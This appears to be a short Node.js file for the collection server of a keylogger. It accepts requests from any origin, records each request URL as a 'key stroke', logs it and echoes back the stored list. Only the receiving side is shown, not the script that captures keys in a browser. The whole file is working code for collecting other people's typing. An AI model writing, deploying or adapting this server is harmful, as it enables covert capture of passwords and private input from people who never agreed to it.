var http = require("http");

var keyArray = [];

var myServer = http.createServer(function(request, response){

    //allows access
    response.setHeader('Access-Control-Allow-Origin', '*');

    //push the key strokes into an array
    keyArray.push(request.url)

    //display array on terminal
    console.log(request.url)

    //displays array in
    response.write(keyArray.toString());

    response.end();
})
myServer.listen(5000);
